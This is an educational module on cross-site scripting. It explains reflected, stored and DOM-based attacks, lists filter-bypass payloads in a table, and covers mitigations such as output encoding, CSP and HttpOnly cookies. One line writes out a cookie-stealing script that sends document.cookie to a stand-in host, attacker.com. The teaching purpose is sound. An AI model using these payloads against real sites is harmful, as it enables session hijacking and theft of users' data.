Module: Cross-Site Scripting (XSS) Deep Dive

1. Core Architectural Concept 🧠

Cross-Site Scripting (XSS) is a client-side vulnerability where malicious scripts are injected into otherwise benign and trusted websites. Unlike server-side vulnerabilities (like SQLi or Command Injection), XSS targets the users of the application, not the application backend itself.

The core problem arises when an application includes untrusted data in a web page without proper validation or escaping (Content Security Policy violations). If an attacker can make a webpage execute their JavaScript in another user's browser, they have achieved XSS. Because the script is executed by the victim's browser, the malicious code can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.

💡
Pro Tip: XSS is effectively the ability to force a victim's browser to execute arbitrary JavaScript. Think of it less as "defacing a website" and more as "Remote Code Execution (RCE) inside a victim's web browser."

2. The Three Pillars of XSS 🎯

To truly understand XSS, you must differentiate between how the payload is delivered to the victim. There are three primary types of XSS.

Type 1: Reflected XSS (Non-Persistent)

The injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. The payload is usually delivered to the victim via a malicious link or phishing email.

👨💻 Attacker crafts malicious URL `?q=<script>steal()</script>`
↓
📧 Phishing email sent to Victim with the link
↓
🖱️ Victim clicks link, Server reflects the `q` param
↓
💉 Victim Browser executes the JS instantly

Type 2: Stored XSS (Persistent)

The injected script is permanently stored on the target servers, such as in a database natively (e.g., in a forum post, visitor log, or comment field). The victim retrieves the malicious script when they navigate to the affected page.

👨💻 Attacker submits comment: `Good post! <script>steal()</script>`
↓
💾 Server saves the raw comment to the database
↓
🏃 Victim 1, Victim 2, and Admin loads the page
↓
💉 Every victim's browser executes the JS instantly

Type 3: DOM-Based XSS

The vulnerability exists in client-side code rather than server-side code. The payload never even reaches the server; it is parsed entirely by the client's browser DOM (Document Object Model) via insecure sinks like `innerHTML` or `eval()`.

3. Payload Arsenal & Bypasses ⚔️

Modern applications usually deploy some form of Web Application Firewall (WAF) or basic sanitization. Attackers must use creative payloads to bypass them.

Bypass Technique Payload Example Why it works
Basic / No Filter <script>alert(1)</script> Standard execution context.
Event Handler Injection <img src=x onerror=alert(1)> Some WAFs block <script> tags entirely but forget about image `onerror` events.
Link Protocol Injection <a href="javascript:alert(1)">Click me</a> Executes JS when the user is tricked into clicking the anchor link.
Case Manipulation <sCRiPt>alert(1)</ScRiPt> Bypasses poor regex filters that are case-sensitive matching strictly lowercase `script`.
Encoded Payloads %3Cscript%3Ealert(1)%3C%2Fscript%3E URL encoding is automatically decoded by the browser, but might slip past initial server WAFs.
⚠️
Weaponizing XSS: `alert(1)` is just a Proof of Concept (PoC). In a real attack, the payload looks like:
<script>fetch('https://attacker.com/log?cookie=' + btoa(document.cookie))</script>

Fix / Mitigation Strategies

XSS is solved by ensuring the browser treats user data as Content, never as Executable Code.

  • Context-Aware Output Encoding: Always encode characters like `<`, `>`, `&`, `'`, `"` into their HTML entities (e.g., `&lt;`) before rendering them on screen.
  • Content Security Policy (CSP): Implement HTTP headers like `Content-Security-Policy: default-src 'self'` to strictly limit which domains can execute scripts on your site. This prevents inline scripts entirely.
  • HttpOnly Flags: Set cookies (especially Session IDs) to `HttpOnly`. This prevents JavaScript (and thus XSS) from being able to read `document.cookie`, killing the session hijacking vector.
